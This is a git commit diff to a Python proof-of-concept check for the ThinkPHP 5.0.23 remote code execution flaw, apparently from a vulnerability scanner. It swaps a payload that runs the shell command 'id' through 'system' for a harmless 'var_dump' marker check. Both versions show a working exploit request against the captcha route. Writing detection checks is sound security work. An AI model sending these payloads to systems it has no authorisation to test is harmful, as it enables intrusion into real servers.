13251924a073c0a071e02ff639454ff2d9fb60f2
lisa-hue <78603109+lisa-hue@users.noreply.github.com>
2022-06-15 23:02:34 +0800

    Update ThinkPHP5_5.0.23_Remote_Code_Execution.py

--- poc/ThinkPHP5_5.0.23_Remote_Code_Execution.py
+++ poc/ThinkPHP5_5.0.23_Remote_Code_Execution.py
@@ -34,16 +34,16 @@ def thinkphp_construct_code_exec_verify(url):
     }
     payload = {
         '_method':'__construct',
-        'filter[]':'system',
+        'filter[]':'var_dump',
         'method':'get',
-        'server[REQUEST_METHOD]':'id',
+        'server[REQUEST_METHOD]':'56540676a129760a3',
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
         print(vurl)
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
         #print(req.text)
-        if "uid=" in req.text and "gid=" in req.text:
+        if 'string(17) "56540676a129760a3"' in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             pocdict['payload'] = payload
